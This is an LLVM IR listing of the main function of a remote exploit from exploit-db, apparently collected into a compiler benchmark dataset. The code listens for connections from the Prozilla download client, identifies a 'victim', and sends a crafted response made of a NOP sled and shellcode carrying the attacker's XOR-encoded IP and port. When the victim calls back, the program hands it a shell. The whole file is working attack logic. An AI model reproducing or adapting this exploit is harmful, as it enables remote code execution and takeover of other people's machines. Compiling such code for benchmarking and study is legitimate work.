; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_652.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_652.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [6 x i8] c"hc:p:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [16 x i8] c"Invalid port.\0A\0A\00", align 1
@MAX_RESPONSE = common dso_local global i32 0, align 4
@TRUE = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [20 x i8] c"[+] Victim at : %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"Prozilla\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"[+] Victim using Prozilla.\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"SSSS\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"Nice , Victim Responded!\0A\00", align 1
@.str.8 = private unnamed_addr constant [62 x i8] c"[+] Victim is not using Prozilla! Sending a normal response.\0A\00", align 1
@real_response = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [5 x i8] c"send\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"Done\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca [2048 x i8], align 16
  %22 = alloca [2048 x i8], align 16
  %23 = alloca %struct.sockaddr_in*, align 8
  %24 = alloca %struct.sockaddr_in*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 194, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %25 = call i64 @malloc(i32 4)
  %26 = inttoptr i64 %25 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %26, %struct.sockaddr_in** %23, align 8
  %27 = call i64 @malloc(i32 4)
  %28 = inttoptr i64 %27 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %28, %struct.sockaddr_in** %24, align 8
  br label %29

29:                                               ; preds = %58, %2
  %30 = load i32, i32* %4, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = call i32 @getopt(i32 %30, i8** %31, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i32 %32, i32* %12, align 4
  %33 = load i32, i32* @EOF, align 4
  %34 = icmp ne i32 %32, %33
  br i1 %34, label %35, label %59

35:                                               ; preds = %29
  %36 = load i32, i32* %12, align 4
  switch i32 %36, label %58 [
    i32 104, label %37
    i32 99, label %42
    i32 112, label %45
  ]

37:                                               ; preds = %35
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @usage(i8* %40)
  br label %42

42:                                               ; preds = %35, %37
  store i32 1, i32* %8, align 4
  %43 = load i32, i32* @optarg, align 4
  %44 = call i32 @sscanf(i32 %43, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32* %17, i32* %18, i32* %19, i32* %20)
  br label %58

45:                                               ; preds = %35
  store i32 1, i32* %7, align 4
  %46 = load i32, i32* @optarg, align 4
  %47 = call i32 @atoi(i32 %46)
  store i32 %47, i32* %9, align 4
  %48 = load i32, i32* %9, align 4
  %49 = icmp sle i32 %48, 0
  br i1 %49, label %53, label %50

50:                                               ; preds = %45
  %51 = load i32, i32* %9, align 4
  %52 = icmp sgt i32 %51, 65535
  br i1 %52, label %53, label %57

53:                                               ; preds = %50, %45
  %54 = load i32, i32* @stderr, align 4
  %55 = call i32 (i32, i8*, ...) @fprintf(i32 %54, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  %56 = call i32 @exit(i32 1) #3
  unreachable

57:                                               ; preds = %50
  br label %58

58:                                               ; preds = %57, %35, %42
  br label %29

59:                                               ; preds = %29
  %60 = load i32, i32* %7, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %68

62:                                               ; preds = %59
  %63 = load i32, i32* %9, align 4
  %64 = and i32 %63, 65280
  %65 = ashr i32 %64, 8
  store i32 %65, i32* %10, align 4
  %66 = load i32, i32* %9, align 4
  %67 = and i32 %66, 255
  store i32 %67, i32* %11, align 4
  br label %74

68:                                               ; preds = %59
  store i32 8080, i32* %9, align 4
  %69 = load i32, i32* %9, align 4
  %70 = and i32 %69, 65280
  %71 = ashr i32 %70, 8
  store i32 %71, i32* %10, align 4
  %72 = load i32, i32* %9, align 4
  %73 = and i32 %72, 255
  store i32 %73, i32* %11, align 4
  br label %74

74:                                               ; preds = %68, %62
  %75 = load i32, i32* %8, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %82, label %77

77:                                               ; preds = %74
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 0
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @usage(i8* %80)
  br label %82

82:                                               ; preds = %77, %74
  %83 = getelementptr inbounds [2048 x i8], [2048 x i8]* %21, i64 0, i64 0
  %84 = load i32, i32* @MAX_RESPONSE, align 4
  %85 = call i32 @memset(i8* %83, i32 0, i32 %84)
  %86 = load %struct.sockaddr_in*, %struct.sockaddr_in** %23, align 8
  %87 = load %struct.sockaddr_in*, %struct.sockaddr_in** %24, align 8
  %88 = call i32 @init_socket(%struct.sockaddr_in* %86, %struct.sockaddr_in* %87, i32* %16)
  store i32 %88, i32* %14, align 4
  %89 = load i32, i32* %17, align 4
  %90 = load i32, i32* %6, align 4
  %91 = call i32 @find_xor(i32 %89, i32 %90, i32 6)
  store i32 %91, i32* %6, align 4
  %92 = load i32, i32* %18, align 4
  %93 = load i32, i32* %6, align 4
  %94 = call i32 @find_xor(i32 %92, i32 %93, i32 6)
  store i32 %94, i32* %6, align 4
  %95 = load i32, i32* %19, align 4
  %96 = load i32, i32* %6, align 4
  %97 = call i32 @find_xor(i32 %95, i32 %96, i32 6)
  store i32 %97, i32* %6, align 4
  %98 = load i32, i32* %20, align 4
  %99 = load i32, i32* %6, align 4
  %100 = call i32 @find_xor(i32 %98, i32 %99, i32 6)
  store i32 %100, i32* %6, align 4
  store i32 207, i32* %6, align 4
  %101 = load i32, i32* %10, align 4
  %102 = load i32, i32* %6, align 4
  %103 = call i32 @find_xor(i32 %101, i32 %102, i32 5)
  store i32 %103, i32* %6, align 4
  %104 = load i32, i32* %11, align 4
  %105 = load i32, i32* %6, align 4
  %106 = call i32 @find_xor(i32 %104, i32 %105, i32 5)
  store i32 %106, i32* %6, align 4
  br label %107

107:                                              ; preds = %188, %82
  %108 = load i64, i64* @TRUE, align 8
  %109 = icmp ne i64 %108, 0
  br i1 %109, label %110, label %189

110:                                              ; preds = %107
  %111 = load i32, i32* %14, align 4
  %112 = load %struct.sockaddr_in*, %struct.sockaddr_in** %24, align 8
  %113 = bitcast %struct.sockaddr_in* %112 to %struct.sockaddr*
  %114 = call i32 @accept(i32 %111, %struct.sockaddr* %113, i32* %16)
  store i32 %114, i32* %15, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %118

116:                                              ; preds = %110
  %117 = call i32 @exit(i32 1) #3
  unreachable

118:                                              ; preds = %110
  %119 = load i32, i32* @stderr, align 4
  %120 = load %struct.sockaddr_in*, %struct.sockaddr_in** %24, align 8
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %120, i32 0, i32 0
  %122 = load i32, i32* %121, align 4
  %123 = call i8* @inet_ntoa(i32 %122)
  %124 = call i32 (i32, i8*, ...) @fprintf(i32 %119, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i8* %123)
  %125 = load i32, i32* %15, align 4
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %22, i64 0, i64 0
  %127 = call i64 @read(i32 %125, i8* %126, i32 2048)
  %128 = icmp eq i64 %127, 0
  br i1 %128, label %129, label %131

129:                                              ; preds = %118
  %130 = call i32 @exit(i32 1) #3
  unreachable

131:                                              ; preds = %118
  %132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %22, i64 0, i64 0
  %133 = call i64 @strstr(i8* %132, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %134 = icmp ne i64 %133, 0
  br i1 %134, label %135, label %138

135:                                              ; preds = %131
  %136 = load i32, i32* @stderr, align 4
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %136, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %13, align 4
  br label %160

138:                                              ; preds = %131
  %139 = getelementptr inbounds [2048 x i8], [2048 x i8]* %22, i64 0, i64 0
  %140 = call i64 @strstr(i8* %139, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %141 = icmp ne i64 %140, 0
  br i1 %141, label %142, label %147

142:                                              ; preds = %138
  %143 = load i32, i32* @stderr, align 4
  %144 = call i32 (i32, i8*, ...) @fprintf(i32 %143, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0))
  %145 = load i32, i32* %15, align 4
  %146 = call i32 @shell(i32 %145)
  br label %159

147:                                              ; preds = %138
  %148 = load i32, i32* @stderr, align 4
  %149 = call i32 (i32, i8*, ...) @fprintf(i32 %148, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.8, i64 0, i64 0))
  %150 = load i32, i32* %15, align 4
  %151 = load i32, i32* @real_response, align 4
  %152 = load i32, i32* @shellcode, align 4
  %153 = call i32 @strlen(i32 %152)
  %154 = call i32 @send(i32 %150, i32 %151, i32 %153, i32 0)
  %155 = icmp eq i32 %154, -1
  br i1 %155, label %156, label %158

156:                                              ; preds = %147
  %157 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0))
  br label %158

158:                                              ; preds = %156, %147
  br label %159

159:                                              ; preds = %158, %142
  br label %160

160:                                              ; preds = %159, %135
  %161 = load i32, i32* %13, align 4
  %162 = icmp eq i32 %161, 1
  br i1 %162, label %163, label %172

163:                                              ; preds = %160
  %164 = load i32, i32* %15, align 4
  %165 = call i32 @send_start(i32 %164)
  %166 = load i32, i32* %15, align 4
  %167 = call i32 @send_nop(i32 %166)
  %168 = load i32, i32* %15, align 4
  %169 = call i32 @send_hostname(i32 %168)
  %170 = load i32, i32* %15, align 4
  %171 = call i32 @send_end(i32 %170)
  store i32 0, i32* %13, align 4
  br label %172

172:                                              ; preds = %163, %160
  %173 = load i32, i32* %15, align 4
  %174 = call i32 @close(i32 %173)
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %22, i64 0, i64 0
  %176 = call i32 @memset(i8* %175, i32 0, i32 2048)
  %177 = call i64 (...) @fork()
  %178 = icmp eq i64 %177, 0
  br i1 %178, label %179, label %185

179:                                              ; preds = %172
  %180 = load %struct.sockaddr_in*, %struct.sockaddr_in** %24, align 8
  %181 = call i32 @free(%struct.sockaddr_in* %180)
  %182 = load %struct.sockaddr_in*, %struct.sockaddr_in** %23, align 8
  %183 = call i32 @free(%struct.sockaddr_in* %182)
  %184 = call i32 @exit(i32 0) #3
  unreachable

185:                                              ; preds = %172
  %186 = load i32, i32* %15, align 4
  %187 = call i32 @close(i32 %186)
  br label %188

188:                                              ; preds = %185
  br label %107

189:                                              ; preds = %107
  %190 = call i32 @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  ret i32 0
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @sscanf(i32, i8*, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @init_socket(%struct.sockaddr_in*, %struct.sockaddr_in*, i32*) #1

declare dso_local i32 @find_xor(i32, i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @shell(i32) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @send_start(i32) #1

declare dso_local i32 @send_nop(i32) #1

declare dso_local i32 @send_hostname(i32) #1

declare dso_local i32 @send_end(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @free(%struct.sockaddr_in*) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
